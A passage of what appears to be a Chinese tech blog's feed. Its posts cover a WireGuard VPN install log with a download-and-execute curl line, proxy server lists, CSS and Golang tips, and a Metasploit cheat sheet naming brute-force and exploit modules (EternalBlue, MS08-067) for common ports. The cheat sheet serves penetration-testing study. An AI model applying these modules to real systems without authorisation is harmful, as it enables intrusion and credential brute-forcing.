sbcl</span><br><span class="line">crystal                    jenkins                    sceptre</span><br><span class="line">curl                       jenkins-job-builder        shibboleth-sp</span><br><span class="line">dartsim                    jfrog-cli-go               skaffold</span><br><span class="line">davmail                    jhipster                   smali</span><br><span class="line">deark                      jsonrpc-glib               smlnj</span><br><span class="line">deployer                   juju                       sourcekitten</span><br><span class="line">dhall-json                 kakoune                    sourcery</span><br><span class="line">diff-pdf                   kallisto                   sphinx-doc</span><br><span class="line">diffoscope                 kapacitor                  sratoolkit</span><br><span class="line">dita-ot                    kettle                     ssh-copy-id</span><br><span class="line">django-completion          kibana@5.6                 svtplay-dl</span><br><span class="line">dnstwist                   knot                       swiftformat</span><br><span class="line">docker                     kore                       tarantool</span><br><span class="line">docker-completion          kubectx                    tarsnap-gui</span><br><span class="line">docker-compose             ldc                        telegraf</span><br><span class="line">docker-squash              lf                         telnet</span><br><span class="line">doctl                      lftp                       template-glib</span><br><span class="line">dosbox                     libarchive                 terraform_landscape</span><br><span class="line">dropbear                   libbi                      terragrunt</span><br><span class="line">duo_unix                   libdazzle                  thors-serializer</span><br><span class="line">dxpy                       libmatio                   tile38</span><br><span class="line">dynare                     libphonenumber             tokei</span><br><span class="line">elasticsearch@5.6          libre                      tomcat</span><br><span class="line">elixir                     librtlsdr                  tomcat-native</span><br><span class="line">elm                        libsoup                    tomcat@7</span><br><span class="line">elm-format                 libtensorflow              tomcat@8</span><br><span class="line">emscripten                 libxlsxwriter              travis</span><br><span class="line">erlang                     liquigraph                 trezor-agent</span><br><span class="line">erlang@20                  logtalk                    typescript</span><br><span class="line">ethereum                   lolcat                     uftp</span><br><span class="line">evince                     lrzsz                      v8</span><br><span class="line">exercism                   lynis                      vagrant-completion</span><br><span class="line">faas-cli                   mackup                     vala</span><br><span class="line">fauna-shell                mdcat                      valabind</span><br><span class="line">fdk-aac-encoder            mdds                       vault</span><br><span class="line">feedgnuplot                mdp                        verilator</span><br><span class="line">field3d                    media-info                 vte3</span><br><span class="line">file-roller                mercurial                  vtk</span><br><span class="line">firebase-cli               meson                      webpack</span><br><span class="line">flann                      meson-internal             wildfly-as</span><br><span class="line">flatcc                     mesos                      wireguard-tools</span><br><span class="line">flow                       metabase                   wireshark</span><br><span class="line">fluent-bit                 metashell                  wp-cli</span><br><span class="line">fn                         mill                       wp-cli-completion</span><br><span class="line">folly                      minimesos                  xml-tooling-c</span><br><span class="line">fontconfig                 minizinc                   xonsh</span><br><span class="line">fortio                     mkcert                     xtensor</span><br><span class="line">freetds                    mkdocs                     yelp-tools</span><br><span class="line">futhark                    mkvtoolnix                 youtube-dl</span><br><span class="line">gauge                      mlkit                      yubico-piv-tool</span><br><span class="line">gdal                       mmseqs2                    zabbix</span><br><span class="line">gdk-pixbuf                 monax                      zsh</span><br><span class="line">gedit                      monetdb                    zsh-completions</span><br><span class="line">==&gt; Renamed Formulae</span><br><span class="line">rebar@3 -&gt; rebar3</span><br><span class="line">==&gt; Deleted Formulae</span><br><span class="line">ghc@8.0</span><br><span class="line"></span><br><span class="line">==&gt; Installing dependencies <span class="keyword">for</span> wireguard-tools: bash, wireguard-go</span><br><span class="line">==&gt; Installing wireguard-tools dependency: bash</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/bash-4.4.23.high_sierra.bot</span><br><span class="line"><span class="comment">######################################################################## 100.0%</span></span><br><span class="line">==&gt; Pouring bash-4.4.23.high_sierra.bottle.tar.gz</span><br><span class="line">==&gt; Caveats</span><br><span class="line">In order to use this build of bash as your login shell,</span><br><span class="line">it must be added to /etc/shells.</span><br><span class="line">==&gt; Summary</span><br><span class="line">🍺  /usr/<span class="built_in">local</span>/Cellar/bash/4.4.23: 146 files, 8.8MB</span><br><span class="line">==&gt; Installing wireguard-tools dependency: wireguard-go</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/wireguard-go-0.0.20180613.h</span><br><span class="line"><span class="comment">######################################################################## 100.0%</span></span><br><span class="line">==&gt; Pouring wireguard-go-0.0.20180613.high_sierra.bottle.tar.gz</span><br><span class="line">🍺  /usr/<span class="built_in">local</span>/Cellar/wireguard-go/0.0.20180613: 5 files, 4.2MB</span><br><span class="line">==&gt; Installing wireguard-tools</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/wireguard-tools-0.0.2018090</span><br><span class="line"><span class="comment">######################################################################## 100.0%</span></span><br><span class="line">==&gt; Pouring wireguard-tools-0.0.20180904.high_sierra.bottle.tar.gz</span><br><span class="line">==&gt; Caveats</span><br><span class="line">Bash completion has been installed to:</span><br><span class="line">  /usr/<span class="built_in">local</span>/etc/bash_completion.d</span><br><span class="line">==&gt; Summary</span><br><span class="line">🍺  /usr/<span class="built_in">local</span>/Cellar/wireguard-tools/0.0.20180904: 10 files, 139.5KB</span><br><span class="line">==&gt; Installing dependencies <span class="keyword">for</span> jq: oniguruma</span><br><span class="line">==&gt; Installing jq dependency: oniguruma</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/oniguruma-6.9.0.high_sierra</span><br><span class="line"><span class="comment">######################################################################## 100.0%</span></span><br><span class="line">==&gt; Pouring oniguruma-6.9.0.high_sierra.bottle.tar.gz</span><br><span class="line">🍺  /usr/<span class="built_in">local</span>/Cellar/oniguruma/6.9.0: 17 files, 1.3MB</span><br><span class="line">==&gt; Installing jq</span><br><span class="line">==&gt; Downloading https://homebrew.bintray.com/bottles/jq-1.5_3.high_sierra.bottle</span><br><span class="line"><span class="comment">######################################################################## 100.0%</span></span><br><span class="line">==&gt; Pouring jq-1.5_3.high_sierra.bottle.tar.gz</span><br><span class="line">🍺  /usr/<span class="built_in">local</span>/Cellar/jq/1.5_3: 19 files, 946.6KB</span><br><span class="line">==&gt; Caveats</span><br><span class="line">==&gt; bash</span><br><span class="line">In order to use this build of bash as your login shell,</span><br><span class="line">it must be added to /etc/shells.</span><br><span class="line">==&gt; wireguard-tools</span><br><span class="line">Bash completion has been installed to:</span><br><span class="line">  /usr/<span class="built_in">local</span>/etc/bash_completion.d</span><br><span class="line">➜  ~ curl -LO https://www.azirevpn.com/dl/azirevpn-wg.sh &amp;&amp; chmod +x ./azirevpn-wg.sh &amp;&amp; ./azirevpn-wg.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3494  100  3494    0     0   1147      0  0:00:03  0:00:03 --:--:--  1147</span><br><span class="line">[?] azirevpn-wg.sh must be run as root. Please enter the password <span class="keyword">for</span> lfoder to <span class="built_in">continue</span>: </span><br><span class="line">[?] Please enter your AzireVPN username: lfoder</span><br><span class="line">[?] Please enter your AzireVPN password: </span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">for</span> server locations.</span><br><span class="line">[+] Generating new se1 private key.</span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">in</span> Stockholm, Sweden.</span><br><span class="line">[+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-se1.conf.</span><br><span class="line">[+] Generating new uk1 private key.</span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">in</span> London, United Kingdom.</span><br><span class="line">[+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-uk1.conf.</span><br><span class="line">[+] Generating new es1 private key.</span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">in</span> Malaga, Spain.</span><br><span class="line">[+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-es1.conf.</span><br><span class="line">[+] Generating new us1 private key.</span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">in</span> Miami, United States.</span><br><span class="line">[+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-us1.conf.</span><br><span class="line">[+] Generating new ca1 private key.</span><br><span class="line">[+] Contacting AzireVPN API <span class="keyword">in</span> Toronto, Canada.</span><br><span class="line">[+] Writing WriteGuard configuration file to /etc/wireguard/azirevpn-ca1.conf.</span><br><span class="line">[+] Success. The following commands may be run <span class="keyword">for</span> connecting to AzireVPN:</span><br><span class="line">- Stockholm, Sweden:</span><br><span class="line">  $ wg-quick up azirevpn-se1</span><br><span class="line">- London, United Kingdom:</span><br><span class="line">  $ wg-quick up azirevpn-uk1</span><br><span class="line">- Malaga, Spain:</span><br><span class="line">  $ wg-quick up azirevpn-es1</span><br><span class="line">- Miami, United States:</span><br><span class="line">  $ wg-quick up azirevpn-us1</span><br><span class="line">- Toronto, Canada:</span><br><span class="line">  $ wg-quick up azirevpn-ca1</span><br><span class="line">➜  ~ wg-quick up azirevpn-se1</span><br><span class="line">[<span class="comment">#] wireguard-go utun</span></span><br><span class="line">WARNING WARNING WARNING WARNING WARNING WARNING WARNING</span><br><span class="line">W                                                     G</span><br><span class="line">W   This is alpha software. It will very likely not   G</span><br><span class="line">W   <span class="keyword">do</span> what it is supposed to <span class="keyword">do</span>, and things may go   G</span><br><span class="line">W   horribly wrong. You have been warned. Proceed     G</span><br><span class="line">W   at your own risk.                                 G</span><br><span class="line">W                                                     G</span><br><span class="line">WARNING WARNING WARNING WARNING WARNING WARNING WARNING</span><br><span class="line">INFO: (utun3) 2018/09/08 22:30:43 Starting wireguard-go version 0.0.20180613</span><br><span class="line">[+] Interface <span class="keyword">for</span> azirevpn-se1 is utun3</span><br><span class="line">[<span class="comment">#] wg setconf utun3 /dev/fd/63</span></span><br><span class="line">[<span class="comment">#] ifconfig utun3 inet 10.10.12.125/19 10.10.12.125 alias</span></span><br><span class="line">[<span class="comment">#] ifconfig utun3 inet6 2a03:8600:1001:4000::c7e/64 alias</span></span><br><span class="line">[<span class="comment">#] ifconfig utun3 up</span></span><br><span class="line">[<span class="comment">#] route -q -n add -inet6 ::/1 -interface utun3</span></span><br><span class="line">[<span class="comment">#] route -q -n add -inet6 8000::/1 -interface utun3</span></span><br><span class="line">[<span class="comment">#] route -q -n add -inet 0.0.0.0/1 -interface utun3</span></span><br><span class="line">[<span class="comment">#] route -q -n add -inet 128.0.0.0/1 -interface utun3</span></span><br><span class="line">[<span class="comment">#] route -q -n add -inet 193.180.164.58 -gateway 192.168.1.1</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers USB 10/100/1000 LAN</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers iPhone USB</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers Wi-Fi</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers Bluetooth PAN</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers Thunderbolt Bridge</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers AnyLink</span></span><br><span class="line">[<span class="comment">#] networksetup -getdnsservers PgyMacClient</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers AnyLink 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers Thunderbolt Bridge 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers Wi-Fi 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers USB 10/100/1000 LAN 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers Bluetooth PAN 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers PgyMacClient 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[<span class="comment">#] networksetup -setdnsservers iPhone USB 91.231.153.2 2001:67c:15ec:1337::2</span></span><br><span class="line">[+] Backgrounding route monitor</span><br><span class="line">➜  ~ curl ip.cn</span><br><span class="line">当前 IP：193.180.164.58 来自：瑞典</span><br><span class="line">➜  ~ wg-quick down azirevpn-se1</span><br><span class="line">[+] Interface <span class="keyword">for</span> azirevpn-se1 is utun3</span><br><span class="line">[<span class="comment">#] rm -f /var/run/wireguard/utun3.sock</span></span><br><span class="line">[<span class="comment">#] rm -f /var/run/wireguard/azirevpn-se1.name</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure></li></ol><h3 id="方法二：HTTPS-代理"><a href="#方法二：HTTPS-代理" class="headerlink" title="方法二：HTTPS 代理"></a>方法二：HTTPS 代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 更新时间 2019年3月15日17:33:51</span><br><span class="line">HTTPS www.copyplay.net:443;</span><br><span class="line">HTTPS hkbn1.ghelper.net:1443;</span><br><span class="line">HTTPS www.onhop.net:443;</span><br><span class="line">HTTPS hgc.onhop.net:443;</span><br><span class="line">HTTPS www.pickdown.net:443;</span><br><span class="line">HTTPS pccw1.ghelper.net:443;</span><br><span class="line">HTTPS pccw7.ghelper.net:443;//IP验证</span><br><span class="line">HTTPS pickdown.net:1443;</span><br><span class="line">HTTPS onhop.net:1443;</span><br><span class="line">HTTPS wtt.tcpbbr.net:443;</span><br><span class="line">HTTPS hgc.onhop.net:443;// IP验证。</span><br><span class="line">HTTPS hgc.21t.xyz:443;//IP验证</span><br><span class="line">HTTPS us.copyplay.net:443;</span><br><span class="line">HTTPS us.onhop.net:443;</span><br><span class="line">HTTPS jp1.tcpbbr.net:443;</span><br><span class="line">HTTPS jp2.tcpbbr.net:443;</span><br><span class="line">HTTPS de.tcpbbr.net:443;</span><br><span class="line">HTTPS uk.tcpbbr.net:443;</span><br><span class="line">HTTPS tw.onhop.net:443;</span><br><span class="line">HTTPS kr.onhop.net:443;</span><br><span class="line">HTTPS ru.onhop.net:443;</span><br><span class="line">HTTPS sg.tcpbbr.net:443;//新加坡</span><br></pre></td></tr></table></figure><h3 id="方法三：PAC大法"><a href="#方法三：PAC大法" class="headerlink" title="方法三：PAC大法"></a>方法三：PAC大法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.chromehelper.net/server/pac/6dbdc26eb1950fbc22a8ca4beaa67adf?aa1e89201e01214c6260c44451d951f9</span><br><span class="line"></span><br><span class="line">https://www.chromehelper.net/server/pac/5f2c213f676684214e58345d34abab09</span><br></pre></td></tr></table></figure><p>共勉。</p>]]></content>
    
    <summary type="html">
    
      酒逢知己千杯少,话不投机半句多，长期更新
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows静默安装WinPcap包</title>
    <link href="http://lfoder.github.io/2018/07/22/Windows%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85WinPcap%E5%8C%85/"/>
    <id>http://lfoder.github.io/2018/07/22/Windows静默安装WinPcap包/</id>
    <published>2018-07-22T12:50:19.000Z</published>
    <updated>2018-08-31T02:06:36.560Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纯CSS实现随机页面背景图自适应</title>
    <link href="http://lfoder.github.io/2018/07/18/%E7%BA%AFCSS%E5%AE%9E%E7%8E%B0%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2%E8%83%8C%E6%99%AF%E5%9B%BE%E8%87%AA%E9%80%82%E5%BA%94/"/>
    <id>http://lfoder.github.io/2018/07/18/纯CSS实现随机页面背景图自适应/</id>
    <published>2018-07-18T01:21:29.000Z</published>
    <updated>2018-08-31T02:30:39.189Z</updated>
    
    <content type="html"><![CDATA[<p>纯CSS实现让页面自动随机更换背景并图片自适应操作，以下是代码部分。</p><p>客观请慢用 …</p><p>代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>随机切换网页背景图效果-css实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body&#123;</span></span><br><span class="line"><span class="undefined">position: fixed;</span></span><br><span class="line"><span class="undefined">    width: 100%;</span></span><br><span class="line"><span class="undefined">    background-repeat: no-repeat;</span></span><br><span class="line"><span class="undefined">    background-size: cover;</span></span><br><span class="line"><span class="undefined">    z-index: 1;</span></span><br><span class="line"><span class="undefined">    top: 0;</span></span><br><span class="line"><span class="undefined">    left: 0;</span></span><br><span class="line"><span class="undefined">    background-position: center 0%;</span></span><br><span class="line"><span class="undefined">    background-attachment: fixed;</span></span><br><span class="line"><span class="undefined">    height: 100%;</span></span><br><span class="line"><span class="undefined">    background-image: url(https://unsplash.it/1600/900?random);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果 (尝试拉动浏览器边框改变浏览器大小)：</p><div id="test" style="            width: 100%;            background-repeat: no-repeat;            background-size: cover;            z-index: 1;            top: 0;            left: 0;            background-position: center 0%;            background-attachment: fixed;            height: 500px;            background-image: url(https://unsplash.it/1600/900?random);"></div>]]></content>
    
    <summary type="html">
    
      纯CSS实现让页面自动随机更换背景并图片自适应操作
    
    </summary>
    
      <category term="前端笔记" scheme="http://lfoder.github.io/categories/%E5%89%8D%E7%AB%AF%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="HTML" scheme="http://lfoder.github.io/tags/HTML/"/>
    
      <category term="CSS" scheme="http://lfoder.github.io/tags/CSS/"/>
    
      <category term="自适应" scheme="http://lfoder.github.io/tags/%E8%87%AA%E9%80%82%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>MetaSploit针对常用端口服务的渗透测试</title>
    <link href="http://lfoder.github.io/2018/07/17/MetaSploit%E9%92%88%E5%AF%B9%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://lfoder.github.io/2018/07/17/MetaSploit针对常用端口服务的渗透测试/</id>
    <published>2018-07-17T02:53:10.000Z</published>
    <updated>2018-07-17T03:51:46.527Z</updated>
    
    <content type="html"><![CDATA[<h3 id="针对端口的攻击模块选择"><a href="#针对端口的攻击模块选择" class="headerlink" title="针对端口的攻击模块选择"></a>针对端口的攻击模块选择</h3><h4 id="Port-gt-21-FTP"><a href="#Port-gt-21-FTP" class="headerlink" title="Port =&gt; 21 [FTP]"></a>Port =&gt; 21 [FTP]</h4><blockquote><p>FTP 服务端开放监听端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/ftp/ftp_login        // FTP登录口令爆破</li></ul><h4 id="Port-gt-22-SSH"><a href="#Port-gt-22-SSH" class="headerlink" title="Port =&gt; 22 [SSH]"></a>Port =&gt; 22 [SSH]</h4><blockquote><p>SSH 服务开放监听端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/ssh/ssh_login     // SSH登录口令爆破</li></ul><h4 id="Port-gt-23-Telnet"><a href="#Port-gt-23-Telnet" class="headerlink" title="Port =&gt; 23 [Telnet]"></a>Port =&gt; 23 [Telnet]</h4><blockquote><p>telnet 服务开放监听端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/telnet/telnet_login    // Telnet 口令爆破</li></ul><h4 id="Port-gt-445-SMB"><a href="#Port-gt-445-SMB" class="headerlink" title="Port =&gt; 445 [SMB]"></a>Port =&gt; 445 [SMB]</h4><blockquote><p>SMB协议默认端口</p></blockquote><p>模块选择:</p><ul><li>exploit/windows/smb/ms08_067_netapi        // 远程溢出漏洞</li><li>exploit/windows/smb/ms17_010_eternalblue    // 永恒之蓝 远程命令执行</li><li>auxiliary/scanner/smb/smb_login              // SMB 登录口令爆破</li></ul><p>相关CVE:</p><ul><li>CVE-2017-7494    </li></ul><h4 id="Port-gt-3389-RDP"><a href="#Port-gt-3389-RDP" class="headerlink" title="Port =&gt; 3389 [RDP]"></a>Port =&gt; 3389 [RDP]</h4><blockquote><p>Windows远程桌面默认端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/rdp/ms12_020_check </li></ul><h4 id="Port-gt-5900-VNC"><a href="#Port-gt-5900-VNC" class="headerlink" title="Port =&gt; 5900 [VNC]"></a>Port =&gt; 5900 [VNC]</h4><blockquote><p>vnc服务默认端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/vnc/vnc_none_auth</li><li>auxiliary/scanner/vnc/vnc_login</li><li>exploit/multi/vnc/vnc_keyboard_exec</li></ul><h4 id="Port-gt-1433-SQLServer"><a href="#Port-gt-1433-SQLServer" class="headerlink" title="Port =&gt; 1433 [SQLServer]"></a>Port =&gt; 1433 [SQLServer]</h4><blockquote><p>SQLServer 默认端口</p></blockquote><p>模块选择:</p><ul><li>use auxiliary/scanner/mssql/mssql_login</li></ul><h4 id="Port-gt-3306-MySQL"><a href="#Port-gt-3306-MySQL" class="headerlink" title="Port =&gt; 3306 [MySQL]"></a>Port =&gt; 3306 [MySQL]</h4><blockquote><p>MySQL 数据库默认端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/mysql/mysql_login</li></ul><h4 id="Port-gt-27017-27018-MongoDB"><a href="#Port-gt-27017-27018-MongoDB" class="headerlink" title="Port =&gt; 27017,27018 [MongoDB]"></a>Port =&gt; 27017,27018 [MongoDB]</h4><blockquote><p>MongoDB默认端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/mongodb/mongodb_login </li></ul><h4 id="Port-gt-6379-Redis"><a href="#Port-gt-6379-Redis" class="headerlink" title="Port =&gt; 6379 [Redis]"></a>Port =&gt; 6379 [Redis]</h4><blockquote><p>Redis 默认端口</p></blockquote><p>模块选择:</p><ul><li>auxiliary/scanner/redis/redis_login</li><li>auxiliary/scanner/redis/file_upload </li></ul>]]></content>
    
    <summary type="html">
    
      针对常用的端口如何选择使用MSF的模块进行针对攻击
    
    </summary>
    
      <category term="MetaSploit 笔记" scheme="http://lfoder.github.io/categories/MetaSploit-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MetaSploit" scheme="http://lfoder.github.io/tags/MetaSploit/"/>
    
  </entry>
  
  <entry>
    <title>Golang在macOS High Sierra 10.13.5上不用使用Debug的原因和处理方法</title>
    <link href="http://lfoder.github.io/2018/07/10/Golang%E5%9C%A8macOS-High-Sierra-10-13-5%E4%B8%8A%E4%B8%8D%E7%94%A8%E4%BD%BF%E7%94%A8Debug%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%92%8C%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/"/>
    <id>http://lfoder.github.io/2018/07/10/Golang在macOS-High-Sierra-10-13-5上不用使用Debug的原因和处理方法/</id>
    <published>2018-07-10T09:28:01.000Z</published>
    <updated>2018-07-10T09:38:32.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><p>在 VSCode 或 Goland 中使用Debug功能是，调试窗口输出如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2018/07/10 17:19:15 server.go:73: Using API v1</span><br><span class="line">2018/07/10 17:19:15 debugger.go:98: launching process with args: [/Users/******/GolangProjects/**********]</span><br><span class="line">could not launch process: EOF</span><br><span class="line">Process exiting with code: 1</span><br></pre></td></tr></table></figure><h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h3><p>在 macOS 10.13 版本中，Command Line Tool不支持Golang的调试工具dlv</p><blockquote><p>参考：</p><ol><li><a href="https://link.zhihu.com/?target=https%3A//intellij-support.jetbrains.com/hc/en-us/community/posts/360000164764-Goland-Debugger-could-not-launch-process-EOF" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//intellij-support.jetbrains.com/hc/en-us/community/posts/360000164764-Goland-Debugger-could-not-launch-process-EOF</a></li><li><a href="https://link.zhihu.com/?target=https%3A//github.com/derekparker/delve/issues/1165" target="_blank" rel="noopener">https://link.zhihu.com/?target=https%3A//github.com/derekparker/delve/issues/1165</a></li></ol></blockquote><p>需要等待 derekparker/delve 修复这个问题</p><h3 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h3><p>目前只有 Workaround 的方法：</p><ol><li><p>删除当前macOS系统的Command Line Tool</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /Library/Developer/CommandLineTools</span><br></pre></td></tr></table></figure></li><li><p>登录苹果开发者平台，然后前往 <a href="https://developer.apple.com/download/more/" target="_blank" rel="noopener">https://developer.apple.com/download/more/</a> 下载 <strong>Command Line Tools (macOS 10.13) for Xcode 9.4.1</strong> </p><p>目前我写这篇博客的时候，最新版是这个版本，你可以根据你登录平台的时间寻找最新版本下载。 </p></li><li><p>安装之。</p></li></ol>]]></content>
    
    <summary type="html">
    
      升级了macOS系统到 macOS High Sierra 10.13.5 以后，导致Golang的Debug功能不能正常使用了，这里列举出错误原因和解决方案。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>禁止Oh-my-zsh粘贴URL特殊字符时自动转义</title>
    <link href="http://lfoder.github.io/2018/07/09/%E7%A6%81%E6%AD%A2Oh-my-zsh%E7%B2%98%E8%B4%B4URL%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%97%B6%E8%87%AA%E5%8A%A8%E8%BD%AC%E4%B9%89/"/>
    <id>http://lfoder.github.io/2018/07/09/禁止Oh-my-zsh粘贴URL特殊字符时自动转义/</id>
    <published>2018-07-09T05:26:48.000Z</published>
    <updated>2018-07-09T05:28:50.831Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在终端下使用zsh 粘贴时会自动把URL特殊字符转义，特别是使用SQLMAP的时候</p></blockquote><p>把 /root/.oh-my-zsh/lib/misc.zsh 文件中的第一段 if 注释掉 OK 啦 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># if [[ $ZSH_VERSION != 5.1.1 ]]; then </span><br><span class="line"># for d in $fpath; do </span><br><span class="line"># if [[ -e &quot;$d/url-quote-magic&quot; ]]; then </span><br><span class="line"># if is-at-least 5.1; then </span><br><span class="line"># autoload -Uz bracketed-paste-magic </span><br><span class="line"># zle -N bracketed-paste bracketed-paste-magic </span><br><span class="line"># fi </span><br><span class="line"># autoload -Uz url-quote-magic </span><br><span class="line"># zle -N self-insert url-quote-magic </span><br><span class="line"># break </span><br><span class="line"># fi </span><br><span class="line"># done </span><br><span class="line"># fi</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;在终端下使用zsh 粘贴时会自动把URL特殊字符转义，特别是使用SQLMAP的时候&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把 /root/.oh-my-zsh/lib/misc.zsh 文件中的第一段 if 注释掉 OK 啦 &lt;/p&gt;
&lt;fig
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="zsh" scheme="http://lfoder.github.io/tags/zsh/"/>
    
      <category term="终端优化" scheme="http://lfoder.github.io/tags/%E7%BB%88%E7%AB%AF%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MacOS上微信多开插件WeChatTweak(免验证登录+消息防撤回)</title>
